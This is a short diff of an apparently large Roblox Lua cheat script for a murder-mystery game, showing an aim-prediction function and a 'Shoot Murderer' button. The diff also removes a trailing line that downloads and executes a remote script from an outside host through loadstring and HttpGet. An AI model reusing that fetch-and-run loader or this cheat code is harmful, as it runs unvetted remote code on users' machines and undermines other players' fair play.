@@ -3646,7 +3646,7 @@ local function getPredictedPositionShoot(playerToPredict, shootOffsetVal)
 	return predictedPosition
 end
 
-shootMurdererButton = createButton("ShootMurdererButton", "Shoot Murderer: OFF", 206.5)
+shootMurdererButton = createButton("ShootMurdererButton", "Shoot Murderer", 206.5)
 shootMurdererButton.MouseButton1Click:Connect(function()
 	if findSherifShoot() ~= player then 
 		print("You're not sheriff/hero.")
@@ -4140,7 +4140,3 @@ task.spawn(function()
 		removeGlitchProof()
 	end
 end)
-
-wait(0.5)
-
-loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Invisible-FE-19153"))()
